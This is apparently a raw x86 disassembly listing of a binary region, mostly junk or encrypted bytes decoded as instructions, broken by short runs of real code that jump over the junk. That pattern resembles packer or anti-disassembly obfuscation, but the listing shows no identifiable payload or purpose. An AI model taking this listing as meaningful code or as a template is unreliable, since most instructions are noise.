  40296a:	inc    edx
  40296b:	pop    esp
  40296c:	aam    0xfe
  40296e:	fadd   st(2),st
  402970:	ins    DWORD PTR es:[edi],dx
  402971:	fwait
  402972:	rol    BYTE PTR [ebx],1
  402974:	sbb    BYTE PTR [ebx+0x6f5463f4],dh
  40297a:	fs hlt 
  40297c:	idiv   DWORD PTR [ecx-0x3d]
  40297f:	xor    edi,DWORD PTR [ebx+eax*8+0x4801ae71]
  402986:	mov    ecx,0xc9264d96
  40298b:	inc    eax
  40298c:	cli    
  40298d:	stos   BYTE PTR es:[edi],al
  40298e:	sbb    eax,0x3e38634b
  402993:	jecxz  0x4029fd
  402995:	fst    st(4)
  402997:	adc    bh,bl
  402999:	mov    DWORD PTR [ebx-0x1f],eax
  40299c:	mov    edx,0x8273adc5
  4029a1:	sbb    esi,DWORD PTR [ebp-0x69d32cb3]
  4029a7:	sub    eax,0xaba9d159
  4029ac:	and    eax,ecx
  4029ae:	sbb    ebp,ebx
  4029b0:	dec    ecx
  4029b1:	sbb    al,0x21
  4029b3:	adc    eax,0x94dfd1cf
  4029b8:	ret    0x2461
  4029bb:	inc    esi
  4029bc:	jnp    0x4029a8
  4029be:	xchg   edx,eax
  4029bf:	push   eax
  4029c0:	cmp    al,0xdf
  4029c2:	push   0xffffff90
  4029c4:	test   eax,0x1811d644
  4029c9:	fstp   QWORD PTR [ecx+0x57316b9a]
  4029cf:	pop    ecx
  4029d0:	clc    
  4029d1:	sub    esp,ecx
  4029d3:	fld    TBYTE PTR [edx-0x48]
  4029d6:	(bad)  
  4029d7:	sub    ah,ch
  4029d9:	outs   dx,DWORD PTR ds:[esi]
  4029da:	fcomip st,st(6)
  4029dc:	mov    ah,0xe8
  4029de:	add    al,0xff
  4029e0:	into   
  4029e1:	sbb    ch,BYTE PTR ds:0x72424a46
  4029e7:	(bad)  
  4029e8:	sub    eax,0xaa8301da
  4029ed:	scas   eax,DWORD PTR es:[edi]
  4029ee:	out    dx,al
  4029ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029f0:	in     eax,dx
  4029f1:	int    0xf1
  4029f3:	sub    ch,ah
  4029f5:	xor    eax,DWORD PTR [edi-0x60579756]
  4029fb:	push   0xd9acfd3d
  402a00:	mov    ebx,0xd78395c4
  402a05:	inc    ebx
  402a06:	mov    WORD PTR [edi],fs
  402a08:	pop    esi
  402a09:	jno    0x4029bf
  402a0b:	stos   BYTE PTR es:[edi],al
  402a0c:	fs out dx,eax
  402a0e:	ret    0xd8e6
  402a11:	test   al,0x65
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	mov    ebp,0xaa7fd596
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	and    BYTE PTR [ebx+ebx*1],ch
  402a43:	mov    ebp,0x25964e9
  402a48:	jb     0x402ac8
  402a4a:	jns    0x402a6b
  402a4c:	xchg   esp,eax
  402a4d:	sti    
  402a4e:	je     0x4029f5
  402a50:	neg    BYTE PTR [esi]
  402a52:	out    dx,eax
  402a53:	add    al,0x6b
  402a55:	adc    DWORD PTR [esi-0x73e78598],ebp
  402a5b:	(bad)  
  402a5c:	xchg   ecx,eax
  402a5d:	and    bl,BYTE PTR [edi-0x17]
  402a60:	cmp    ebp,ebx
  402a62:	shl    BYTE PTR [ebx+0x295b9676],1
  402a68:	jno    0x4029f4
  402a6a:	rcr    DWORD PTR [edx-0x2439297f],cl
  402a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a71:	dec    esp
  402a72:	adc    eax,DWORD PTR [edx+0x1e736b6e]
  402a78:	add    bh,BYTE PTR [ebx]
  402a7a:	adc    BYTE PTR gs:[edi],0x91
  402a7e:	fidivr WORD PTR [edi]
  402a80:	clc    
  402a81:	mov    edx,DWORD PTR [ebp+0x48]
  402a84:	or     BYTE PTR ds:0xec8c1e41,bh
  402a8a:	jp     0x402aa0
  402a8c:	or     al,0xeb
  402a8e:	sub    dh,0x85
  402a91:	(bad)  
  402a92:	clc    
  402a93:	mov    cl,0x29
  402a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a96:	iret   
  402a97:	hlt    
  402a98:	sub    DWORD PTR [edi-0x1f],ebp
  402a9b:	dec    esp
  402a9c:	loop   0x402a95
  402a9e:	jne    0x402a95
  402aa0:	les    eax,FWORD PTR cs:[ebx+0x4c6a1a10]
  402aa7:	loope  0x402ad2
  402aa9:	fbld   TBYTE PTR ds:0xef6845b8
  402aaf:	fmul   DWORD PTR [edx+0x15b7bfb1]
  402ab5:	les    esp,FWORD PTR [eax+0x2f70e595]
  402abb:	push   0xb5661c9
  402ac0:	pop    ecx
  402ac1:	int    0x87
  402ac3:	test   esp,edi
  402ac5:	outs   dx,DWORD PTR ds:[esi]
  402ac6:	cmp    al,0x88
  402ac8:	pop    ecx
  402ac9:	lock push eax
  402acb:	jo     0x402ac5
  402acd:	add    al,dl
  402acf:	and    ch,BYTE PTR [eax+0x19]
  402ad2:	jmp    0xb007:0x74bc1439
  402ad9:	sub    al,0xb2
  402adb:	xchg   BYTE PTR [edi+0x4b0bee8a],bl
  402ae1:	loopne 0x402af7
  402ae3:	test   DWORD PTR [edx+0x64],eax
  402ae6:	fs xor eax,0xa5cca5c0
  402aec:	xor    BYTE PTR [esi-0x26993933],al
  402af2:	mov    ah,0x5c
  402af4:	call   0xd1be:0x2352f3a7
  402afb:	add    al,0x85
  402afd:	ds push esp
  402aff:	and    eax,0x1c950b4c
  402b04:	repz fisub DWORD PTR ds:0x7c31fd82
  402b0b:	test   eax,0x9d4a8e36
  402b10:	or     BYTE PTR [edx-0x121e76c7],al
  402b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b17:	stc    
  402b18:	push   edi
  402b1a:	and    bl,0xf
  402b1d:	mov    WORD PTR [ebp+edx*8+0x65816e67],ss
  402b24:	call   0xedc9d1d8
  402b29:	test   eax,0xc74b19b2
  402b2e:	jae    0x402afd
  402b30:	popa   
  402b31:	pusha  
  402b32:	xor    eax,0xdf83a4cb
  402b37:	sub    eax,0xfb89c823
  402b3c:	test   eax,0xdf482fed
  402b41:	(bad)  
  402b42:	xchg   dh,bl
  402b44:	or     BYTE PTR [ecx+0x433225c6],ah
  402b4a:	pop    esi
  402b4b:	loopne 0x402b8d
  402b4d:	add    dh,BYTE PTR cs:[edx+0x2772ad8]
  402b54:	cmp    ch,ah
  402b56:	lock jbe 0x402b4d
  402b59:	mov    edx,0xb4dd9d0
  402b5e:	pusha  
  402b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b60:	scas   al,BYTE PTR es:[edi]
  402b61:	loop   0x402ae8
  402b63:	in     eax,dx
  402b64:	push   ds
  402b65:	into   
  402b66:	jl     0x402b1b
  402b68:	xor    eax,0x6faf11d4
  402b6d:	mov    ah,0x2a
  402b6f:	in     eax,dx
  402b70:	je     0x402b5f
  402b72:	and    eax,0xd776db39
  402b77:	mov    ds:0x92c1a264,eax
  402b7c:	les    ebx,FWORD PTR [ebp+edi*8+0x24]
  402b80:	inc    esi
  402b81:	scas   al,BYTE PTR es:[edi]
  402b82:	scas   eax,DWORD PTR es:[edi]
  402b83:	mov    ds,WORD PTR [edi+0x28]
  402b86:	dec    edi
  402b87:	clc    
  402b88:	test   BYTE PTR [ecx+0x24],ah
  402b8b:	mov    ch,0x70
  402b8d:	jne    0x402bb4
  402b8f:	fs mov al,0x3f
  402b92:	or     eax,0x396622e6
  402b97:	or     al,BYTE PTR [eax+0x64]
  402b9a:	fistp  DWORD PTR [esp+eax*1-0x6d90a1fa]
  402ba1:	int    0x40
  402ba3:	push   eax
  402ba4:	jcxz   0x402b57
  402ba7:	xchg   esp,eax
  402ba8:	jo     0x402ba7
  402baa:	cmp    BYTE PTR [ecx-0x591e58df],bl
  402bb0:	bound  ebp,QWORD PTR [ebp+0x1b]
  402bb3:	je     0x402bec
  402bb5:	add    bl,BYTE PTR [edi+ebx*2]
  402bb8:	bnd je 0x402b47
  402bbb:	pop    ss
  402bbc:	mov    bh,0xe7
  402bbe:	aaa    
  402bbf:	xor    DWORD PTR [ecx+edi*4+0x38],ecx
  402bc3:	enter  0xc085,0xf
  402bc7:	test   BYTE PTR [eax],ch
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	(bad)  
  402c13:	nop
  402c14:	(bad)  
  402c15:	or     edi,DWORD PTR ss:[esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bc8
  402c1e:	call   0x81fc:0xbbdbace8
  402c25:	mov    ds:0x7ad83a86,al
  402c2a:	scas   al,BYTE PTR es:[edi]
  402c2b:	lock or eax,DWORD PTR [ecx-0x5ae9fac6]
  402c32:	mov    ch,0xde
  402c34:	xor    DWORD PTR [ebp-0x2b],ebx
  402c37:	adc    BYTE PTR [ebp-0x49],0x33
  402c3b:	or     esp,edx
  402c3d:	pop    ecx
  402c3e:	std    
  402c3f:	mov    ebp,0xc95c17b8
  402c44:	lock pusha 
  402c46:	xchg   ebx,esi
  402c48:	push   es
  402c49:	popa   
  402c4a:	dec    ecx
  402c4b:	sti    
  402c4c:	mov    ds:0xa456a71f,eax
  402c51:	cmp    eax,0x65bdfeb
  402c56:	pop    ebx
  402c57:	xor    bl,bl
  402c59:	xor    eax,0xb8a833fb
  402c5e:	sahf   
  402c5f:	ds icebp 
  402c61:	cmc    
  402c62:	and    BYTE PTR [eax],dl
  402c64:	shl    edx,1
  402c66:	push   esi
  402c67:	das    
  402c68:	stos   DWORD PTR es:[edi],eax
  402c69:	addr16 and eax,0x199dbb10
  402c6f:	jmp    0xa620fc86
  402c74:	fild   DWORD PTR [edi-0x12]
  402c77:	push   ss
  402c78:	adc    al,0x3b
  402c7a:	(bad)  
  402c7b:	ficomp DWORD PTR [edx]
  402c7d:	xchg   DWORD PTR [ebx-0x45],edi
  402c80:	push   edx
  402c81:	int    0xb0
  402c83:	sub    al,0xdf
  402c85:	adc    eax,0x5aee5fef
  402c8a:	or     al,0xfa
  402c8c:	ficomp WORD PTR [esi-0x71734df4]
  402c92:	mov    eax,ds:0xff33dd1c
  402c97:	shl    DWORD PTR [edi+ecx*4],1
  402c9a:	pushf  
  402c9b:	mov    esi,0x3a4da55d
  402ca0:	fmul   st,st(4)
  402ca2:	(bad)  
  402ca3:	hlt    
  402ca4:	inc    DWORD PTR [edx]
  402ca6:	repnz mov dh,0x6f
  402ca9:	aam    0xc2
  402cab:	mov    BYTE PTR [esi+ecx*4+0x7bbb2b6e],bh
  402cb2:	loop   0x402c92
  402cb4:	mov    edx,esp
  402cb6:	cld    
  402cb7:	mov    dh,0xdf
  402cb9:	out    dx,al
  402cba:	dec    ecx
  402cbb:	stc    
  402cbc:	sbb    ebp,ebx
  402cbe:	sbb    DWORD PTR [ebp+0x3c5492bc],eax
  402cc4:	sub    DWORD PTR [ecx-0x29f11c05],ecx
  402cca:	push   ebp
  402ccb:	xchg   esp,eax
  402ccc:	push   eax
  402ccd:	inc    edi
  402cce:	push   ecx
  402ccf:	cmc    
  402cd0:	mov    edi,0xc4919416
  402cd5:	(bad)  
  402cd6:	retf   0x8604
  402cd9:	(bad)  
  402cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cdb:	inc    ecx
  402cdc:	scas   al,BYTE PTR es:[edi]
  402cdd:	and    eax,0xc8d2bc3e
  402ce2:	cmp    DWORD PTR [eax],eax
  402ce4:	pop    ebx
  402ce5:	inc    ecx
  402ce6:	scas   eax,DWORD PTR es:[edi]
  402ce7:	js     0x402cfa
  402ce9:	les    edx,FWORD PTR [edx-0x69d0d957]
  402cef:	sti    
  402cf0:	inc    edi
  402cf1:	xchg   ebx,eax
  402cf2:	xor    eax,0x5c583e6a
  402cf7:	and    esi,DWORD PTR [eax+ebp*8-0x265db304]
  402cfe:	inc    eax
  402cff:	cmp    DWORD PTR [edi+ebp*2+0x4a],edx
  402d03:	xadd   ch,bl
  402d06:	fdivr  DWORD PTR [eax]
  402d08:	aam    0x3c
  402d0a:	fwait
  402d0b:	call   0x4cfb:0x196e662
  402d12:	xchg   ebp,eax
  402d13:	pop    esi
  402d14:	xchg   edx,eax
  402d15:	mov    ebx,0x5fd3608a
  402d1a:	sub    eax,0x29421407
  402d1f:	cmc    
  402d20:	inc    esp
  402d21:	jbe    0x402d1d
  402d23:	add    ecx,DWORD PTR [ecx]
  402d25:	int3   
  402d26:	mov    dl,0x82
  402d28:	inc    esp
  402d29:	xor    al,0xaa
  402d2b:	and    ch,bl
  402d2d:	ins    BYTE PTR es:[edi],dx
  402d2e:	outs   dx,DWORD PTR ds:[esi]
  402d2f:	xor    al,0x4e
  402d31:	in     al,dx
  402d32:	jbe    0x402d4d
  402d34:	mov    dh,BYTE PTR [ecx-0x7508009a]
  402d3a:	jne    0x402d27
  402d3c:	clc    
  402d3d:	mov    bh,0x24
  402d3f:	push   ds
  402d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d41:	jns    0x402db3
  402d43:	dec    ebx
  402d44:	cmp    eax,0xa4412419
  402d49:	push   ebp
  402d4a:	pop    esi
  402d4b:	clc    
  402d4c:	mov    esp,0x653b01cf
  402d51:	mov    ch,0x30
  402d53:	(bad)
  402d56:	cld    
  402d57:	mul    DWORD PTR [esi-0x4cc4d2b8]
  402d5d:	xor    cl,ah
  402d5f:	out    dx,al
  402d60:	xchg   edi,eax
  402d61:	xchg   edi,eax
  402d62:	int    0xee
  402d64:	neg    DWORD PTR [ebx-0x68]
  402d67:	cs jl  0x402de2
  402d6a:	stc    
  402d6b:	inc    ebx
  402d6c:	jle    0x402dd1
  402d6e:	aaa    
  402d6f:	pop    edi
  402d70:	pop    ds
  402d71:	jg     0x402de8
  402d73:	(bad)  
  402d75:	push   ebx
  402d76:	and    al,0x82
  402d78:	mov    bh,0x26
  402d7a:	mov    al,ds:0xc7aed9ef
  402d7f:	cli    
  402d80:	xor    ebp,DWORD PTR [ecx-0x151abf42]
  402d86:	sti    
  402d87:	add    eax,0x89aaed5b
  402d8c:	test   al,0x6c
  402d8e:	pusha  
  402d8f:	ret    
  402d90:	cmp    al,0x20
  402d92:	inc    edx
  402d93:	mov    ch,0x39
  402d95:	fistp  DWORD PTR [ecx+0x16]
  402d98:	mov    al,ds:0xe5bcd0e0
  402d9d:	pop    esi
  402d9e:	out    dx,eax
  402d9f:	mov    esi,0xfc452b22
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebx+ecx*8+0x59],1
  402de7:	mov    DWORD PTR [edx+0x7e7e08b2],ebp
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402d9f
  402df2:	aaa    
  402df3:	pop    ebp
  402df4:	retf   0xaf08
  402df7:	add    eax,0xedfd1e1e
  402dfc:	sbb    esp,DWORD PTR [esi-0x46a5e395]
  402e02:	fdiv   QWORD PTR ds:0x39b8ea4b
  402e08:	and    bh,cl
  402e0a:	sub    DWORD PTR [edi-0x4d],eax
  402e0d:	mov    bh,BYTE PTR [edi]
  402e0f:	mov    al,0x38
  402e11:	jo     0x402e48
  402e13:	xor    WORD PTR [ebp+0x40],ax
  402e17:	push   ss
  402e18:	push   esi
  402e19:	loop   0x402e53
  402e1b:	pop    eax
  402e1c:	aaa    
  402e1d:	stos   DWORD PTR es:[edi],eax
  402e1e:	mov    ch,0x62
  402e20:	dec    edi
  402e21:	mov    DWORD PTR [esi+0x7920738d],ebx
  402e27:	cwde   
  402e28:	push   esi
  402e29:	inc    esp
  402e2a:	test   DWORD PTR [edi],edi
  402e2c:	pushf  
  402e2d:	test   DWORD PTR [eax],ecx
  402e2f:	hlt    
  402e30:	dec    esi
  402e31:	adc    al,0x30
  402e33:	and    ebp,ecx
  402e35:	inc    ecx
  402e36:	je     0x402dbf
  402e38:	sbb    esp,0x2a
  402e3b:	mov    ecx,0x4bd4f3ad
  402e40:	stos   BYTE PTR es:[edi],al
  402e41:	aas    
  402e42:	sar    BYTE PTR [edi+0x50f55386],cl
  402e48:	dec    edx
  402e49:	sub    BYTE PTR [edx],0xaa
  402e4c:	or     ch,bh
  402e4e:	cmp    al,0xd2
  402e50:	data16 ja 0x402e82
  402e53:	mov    eax,0xe0623628
  402e59:	push   edi
  402e5a:	push   ebx
  402e5b:	sbb    al,0x4b
  402e5d:	lahf   
  402e5e:	sbb    al,0xd
  402e60:	xchg   ebx,eax
  402e61:	jne    0x402dfe
  402e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e64:	rol    BYTE PTR [eax-0x9175b9b],1
  402e6a:	icebp  
  402e6b:	das    
  402e6c:	inc    ebx
  402e6d:	mov    DWORD PTR ds:0xc825,esi
  402e72:	popa   
  402e73:	shl    DWORD PTR [ebx+0x5b4e8664],1
  402e79:	ficom  WORD PTR [esi]
  402e7b:	dec    edi
  402e7c:	mov    edx,0xfaed72be
  402e81:	xor    edi,DWORD PTR gs:[esp+eax*2+0x1e4d7ecd]
  402e89:	and    esi,DWORD PTR [edx]
  402e8b:	lahf   
  402e8c:	scas   eax,DWORD PTR es:[edi]
  402e8d:	jmp    0x402e7a
  402e8f:	pushf  
  402e90:	inc    ebx
  402e91:	es mov al,0x7
  402e94:	shl    DWORD PTR [eax+0x33],cl
  402e97:	aas    
  402e98:	fsubr  st,st(7)
  402e9a:	stos   DWORD PTR es:[edi],eax
  402e9b:	getsec 
  402e9d:	add    DWORD PTR [edx+0x5f],ebp
  402ea0:	pop    ebx
  402ea1:	push   ebx
  402ea2:	icebp  
  402ea3:	cmp    al,BYTE PTR [edx-0x61]
  402ea6:	cmp    al,0x26
  402ea8:	push   ebx
  402ea9:	pushf  
  402eaa:	push   ss
  402eab:	jmp    0xe844:0xffa49e64
  402eb2:	(bad)  
  402eb3:	in     al,0x19
  402eb5:	xchg   DWORD PTR [edx],ebx
  402eb7:	inc    esp
  402eb8:	ins    DWORD PTR es:[edi],dx
  402eb9:	ss repz sahf 
  402ebc:	popa   
  402ebd:	mov    al,ds:0x14ec27bd
  402ec2:	daa    
  402ec3:	loope  0x402f2d
  402ec5:	add    BYTE PTR [eax],ah
  402ec7:	pusha  
  402ec8:	push   edx
  402ec9:	pop    eax
  402eca:	or     esp,DWORD PTR [edi]
  402ecc:	mov    bl,0x98
  402ece:	mov    ebx,0x115c53ef
  402ed3:	push   es
  402ed4:	loop   0x402f23
  402ed6:	lock add bl,ah
  402ed9:	xchg   esp,eax
  402eda:	jecxz  0x402eb1
  402edc:	mov    edi,0x683c95e4
  402ee1:	cmp    DWORD PTR [eax+0x4d],edx
  402ee4:	ror    DWORD PTR [ebp+0x21],cl
  402ee7:	sti    
  402ee8:	out    dx,al
  402ee9:	dec    ebx
  402eea:	lods   al,BYTE PTR ds:[esi]
  402eeb:	push   0xffffff8d
  402eed:	imul   esi,DWORD PTR [edx],0x80c08622
  402ef3:	push   edi
  402ef4:	inc    ebp
  402ef5:	addr16 mov bl,0x66
  402ef8:	and    bl,bh
  402efa:	imul   esi,DWORD PTR [edi-0x6],0x6f
  402efe:	mov    ds:0x61fbaa67,eax
  402f03:	in     ax,dx
  402f05:	mov    ds:0x225fe566,eax
  402f0a:	fisub  DWORD PTR [ebx+0x44]
  402f0d:	inc    ebx
  402f0e:	not    DWORD PTR ds:0x122ff240
  402f14:	mov    ebx,0x22bba657
  402f19:	ret    0x63b2
  402f1c:	fucomip st,st(0)
  402f1e:	retf   
  402f1f:	add    eax,0x4e59fad
  402f24:	and    al,0x1f
  402f26:	out    0xc0,eax
  402f28:	hlt    
  402f29:	loope  0x402f65
  402f2b:	mov    bl,0x69
  402f2d:	(bad)  
  402f2e:	or     dh,BYTE PTR [eax-0x4e]
  402f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f32:	inc    edx
  402f33:	mov    cl,BYTE PTR [ebx]
  402f35:	dec    ebp
  402f36:	pop    ds
  402f37:	imul   edx,DWORD PTR [eax+ebp*8-0x26],0xffffff8f
  402f3c:	test   al,0xe3
  402f3e:	mov    cl,0x94
  402f40:	xchg   ecx,eax
  402f41:	cmc    
  402f42:	stos   BYTE PTR es:[edi],al
  402f43:	in     eax,dx
  402f44:	mov    WORD PTR [esi],gs
  402f46:	retf   
  402f47:	and    eax,0x94fa4377
  402f4c:	jno    0x402f36
  402f4e:	popf   
  402f4f:	packuswb mm4,mm0
  402f52:	cli    
  402f53:	push   edx
  402f54:	jmp    0x12a6:0x62fe0d9f
  402f5b:	hlt    
  402f5c:	pop    eax
  402f5d:	fwait
  402f5e:	sti    
  402f5f:	add    al,bh
  402f61:	nop
  402f62:	es and al,ah
  402f65:	inc    ecx
  402f66:	mov    bl,0xa7
  402f68:	pusha  
  402f69:	ja     0x402fa2
  402f6b:	mov    bh,0xe2
  402f6d:	in     eax,0x4f
  402f6f:	repnz pop es
  402f71:	or     eax,DWORD PTR [ebp+0x58d3851]
  402f77:	or     al,0x3c
  402f79:	inc    ecx
  402f7a:	add    bh,bh
  402f7c:	xor    BYTE PTR [ebp+0x4139b805],cl
  402f82:	add    bh,bh
  402f84:	xor    BYTE PTR [ebp+0x413bec05],cl
  402f8a:	add    bh,bh
  402f8c:	xor    BYTE PTR [ebp+0x413d3405],cl
  402f92:	add    bh,bh
  402f94:	xor    BYTE PTR [edi+0x534343d3],al
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x2f7aa5b7]
  402fae:	icebp  
  402faf:	fnstcw WORD PTR [esi]
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f8a
  402fb9:	xchg   edx,eax
  402fba:	and    eax,0x8edb1a52
  402fbf:	push   esi
  402fc0:	xor    al,0xb6
  402fc2:	mov    bl,0x82
  402fc4:	test   eax,0xc3272442
  402fc9:	aam    0x87
  402fcb:	mov    eax,0x6a3d455b
  402fd0:	and    eax,0x50d3db20
  402fd5:	sbb    al,0x73
  402fd7:	inc    edx
  402fd8:	je     0x402f85
  402fda:	test   eax,0xd1da0724
  402fdf:	daa    
  402fe0:	test   edi,0x7bedc14e
  402fe6:	mov    ebp,DWORD PTR [edi]
  402fe8:	jmp    FWORD PTR [ebx-0x3c]
  402feb:	loope  0x40304c
  402fed:	jl     0x402fb9
  402fef:	aam    0x33
  402ff1:	dec    ebx
  402ff2:	das    
  402ff3:	loopne 0x403038
  402ff5:	push   0x71cb4544
  402ffa:	icebp  
  402ffb:	ds sub eax,0xd379cbb7
  403001:	push   esp
  403002:	fwait
  403003:	pop    esi
  403004:	sub    BYTE PTR [ecx+eiz*4-0x13],ah
  403008:	xor    ecx,DWORD PTR [ebp+0x129a788b]
  40300e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40300f:	cli    
  403010:	fs scas al,BYTE PTR es:[edi]
  403012:	cmp    al,0xa5
  403014:	in     al,0x25
  403016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403017:	dec    esi
  403018:	add    BYTE PTR [esi+0x43],0x3e
  40301c:	cli    
  40301d:	cmp    dl,ch
  40301f:	call   0xc5e3d152
  403024:	or     ebx,DWORD PTR [eax-0x1e6188f8]
  40302a:	mov    BYTE PTR [ecx+0x79],dl
  40302d:	adc    DWORD PTR [eax+0x1779204],ebp
  403033:	out    dx,eax
  403034:	mov    dl,0xeb
  403036:	lods   eax,DWORD PTR ds:[esi]
  403037:	outs   dx,DWORD PTR ds:[esi]
  403039:	ins    DWORD PTR es:[edi],dx
  40303a:	jle    0x403034
  40303c:	div    BYTE PTR [esi+eax*4+0x28]
  403040:	fstp   DWORD PTR [esi]
  403042:	push   esi
  403043:	out    dx,al
  403044:	frstor [eax+0x37c40811]
  40304a:	stc    
  40304b:	pop    esp
  40304c:	in     al,dx
  40304d:	add    eax,0x5287b03
  403052:	inc    ecx
  403053:	fldcw  WORD PTR [ebp-0x7cc7d135]
  403059:	nop
  40305a:	xchg   ecx,eax
  40305b:	jae    0x403052
  40305d:	push   ebx
  40305e:	dec    esi
  40305f:	jae    0x403086
  403061:	test   eax,0xd00dbda4
  403066:	cmp    eax,0x62e98d2c
  40306b:	mov    cl,0xaa
  40306d:	sbb    ch,bl
  40306f:	xor    eax,DWORD PTR [edi+0x4e]
  403072:	and    eax,DWORD PTR [edx+0x38a230ed]
  403078:	enter  0x95d5,0xa3
  40307c:	inc    eax
  40307d:	pop    ss
  40307e:	popf   
  40307f:	push   edi
  403080:	jmp    0x403055
  403082:	inc    ecx
  403083:	aad    0x35
  403085:	jns    0x403054
  403087:	aam    0x70
  403089:	xchg   esp,eax
  40308a:	or     al,0x4d
  40308c:	ins    DWORD PTR es:[edi],dx
  40308d:	sbb    ah,al
  40308f:	pop    esp
  403090:	xor    al,BYTE PTR [eax-0x47]
  403093:	sub    al,BYTE PTR [edi+0x2b7c7541]
  403099:	lock sahf 
  40309b:	or     al,0x25
  40309d:	mov    al,ds:0x800dbd28
  4030a2:	je     0x403031
  4030a4:	ja     0x4030b8
  4030a6:	or     edx,DWORD PTR [edx+0x3d]
  4030a9:	rep ins BYTE PTR es:[edi],dx
  4030ab:	dec    edi
  4030ac:	in     eax,0xe2
  4030ae:	jbe    0x40311a
  4030b0:	jmp    0x87c4:0xeb30cc9f
  4030b7:	in     eax,dx
  4030b8:	jae    0x4030be
  4030ba:	pop    edx
  4030bb:	scas   eax,DWORD PTR es:[edi]
  4030bc:	pop    ss
  4030bd:	push   ebp
  4030be:	jge    0x4030db
  4030c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030c1:	fcomp  st(4)
  4030c4:	aas    
  4030c5:	in     al,dx
  4030c6:	jmp    0xb0bb49a4
  4030cb:	dec    ecx
  4030cc:	call   0x72dd:0x2bbc984b
  4030d3:	fistp  QWORD PTR [eax]
  4030d5:	outs   dx,BYTE PTR ds:[esi]
  4030d6:	mov    edi,0x4b792414
  4030db:	sub    al,0x3e
  4030dd:	xchg   edx,eax
  4030de:	sub    DWORD PTR [esi+0x7a398448],esp
  4030e4:	push   0x5b
  4030e6:	ins    DWORD PTR es:[edi],dx
  4030e7:	lahf   
  4030e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030e9:	inc    esi
  4030ea:	shr    DWORD PTR [edx],0xe2
  4030ed:	cs mov al,0xbb
  4030f0:	leave  
  4030f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f2:	adc    ch,0xb0
  4030f5:	sbb    al,BYTE PTR es:[ebx+eax*1]
  4030f9:	add    dh,al
  4030fb:	push   eax
  4030fc:	(bad)  
  4030fd:	aad    0xc3
  4030ff:	sti    
  403100:	mov    bl,0xc7
  403102:	test   DWORD PTR [ecx],eax
  403104:	rol    BYTE PTR [edi],1
  403106:	out    0x4c,eax
  403108:	(bad)  
  403109:	icebp  
  40310a:	test   BYTE PTR [ebp+0x0],cl
  40310d:	adc    cl,dl
  40310f:	and    DWORD PTR [ebx-0x560d2c68],0x42feaad0
  403119:	push   esi
  40311a:	inc    esi
  40311b:	das    
  40311c:	ret    
  40311d:	iret   
  40311e:	frstor [eax+0x54]
  403121:	sahf   
